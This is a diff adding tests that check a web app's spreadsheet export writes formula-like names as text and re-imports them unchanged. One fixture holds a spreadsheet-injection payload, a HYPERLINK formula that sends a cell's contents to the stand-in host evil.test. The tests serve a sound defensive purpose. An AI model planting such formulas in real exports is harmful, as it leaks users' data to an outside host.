@@ -126,3 +126,58 @@ def test_blank_rows_count_toward_the_row_limit():
     tables = read_workbook(data, errors)
     assert errors and str(MAX_ROWS) in errors[0]["message"]
     assert all(n <= ROW_SCAN_LIMIT for t in tables for n, _ in t.rows)
+
+
+# ---- P2: names that look like formulas are written as text
+FORMULA_NAME = '=HYPERLINK("http://evil.test/?"&B3,"Click")'
+
+
+def _workbook(client, cid) -> bytes:
+    r = client.get(f"/api/v1/clients/{cid}/departments/template.xlsx")
+    assert r.status_code == 200
+    return r.content
+
+
+def test_formula_like_person_values_are_written_as_text(client, db, people, live):
+    from tests.tenancy.test_people_import_1103 import _dept, preview
+
+    cid, e, maria = live
+    login_as(client, db, maria)
+    _dept(client, cid, "Finance")
+    r = client.post(f"/api/v1/clients/{cid}/users", json={"first_name": FORMULA_NAME, "last_name": "x", "email": "eve@abc.test",
+                                                          "job_title": "=1+1", "department": "Finance", "role": "contributor"})
+    assert r.status_code == 200, r.text
+    data = _workbook(client, cid)
+    ws = openpyxl.load_workbook(io.BytesIO(data))["Finance"]
+    row = next(r for r in ws.iter_rows(min_row=2) if r[1].value == "eve@abc.test")
+    assert row[0].data_type == "s" and row[0].value == FORMULA_NAME + " x"
+    assert row[3].data_type == "s" and row[3].value == "=1+1"
+    assert not any(c.data_type == "f" for ws_ in openpyxl.load_workbook(io.BytesIO(data)).worksheets for r_ in ws_.iter_rows() for c in r_)
+    # uploaded again unchanged, the person is recognised and nothing changes
+    pv = preview(client, cid, data, "people.xlsx")
+    assert pv["errors"] == [], pv["errors"]
+    eve = next(u for u in pv["users"] if u["email"] == "eve@abc.test")
+    assert eve["action"] == "unchanged" and eve["name"] == FORMULA_NAME + " x"
+
+
+def test_formula_like_department_name_is_text_and_round_trips(client, db, people, live):
+    from tests.tenancy.test_people_import_1103 import _dept, _user, preview
+
+    cid, e, maria = live
+    login_as(client, db, maria)
+    _dept(client, cid, "=1+2")
+    _dept(client, cid, "@Ops[EU]:*?")
+    _user(client, cid, "Gil", "Lee", "gil@abc.test", role="dept_compliance_lead", department="=1+2")
+    data = _workbook(client, cid)
+    wb = openpyxl.load_workbook(io.BytesIO(data))
+    ds = wb["Departments"]
+    cell = next(r[0] for r in ds.iter_rows(min_row=2) if r[0].value == "=1+2")
+    assert cell.data_type == "s"
+    for t in wb.sheetnames:
+        assert not t.startswith(("=", "+", "-", "@", "'")) and len(t) <= 31 and not set(t) & set('[]:*?/\\')
+    assert len({t.casefold() for t in wb.sheetnames}) == len(wb.sheetnames)
+    pv = preview(client, cid, data, "people.xlsx")
+    assert pv["errors"] == [], pv["errors"]
+    assert {d["name"]: d["action"] for d in pv["departments"]} == {"=1+2": "unchanged", "@Ops[EU]:*?": "unchanged"}
+    gil = next(u for u in pv["users"] if u["email"] == "gil@abc.test")
+    assert gil["action"] == "unchanged" and gil["department"] == "=1+2"
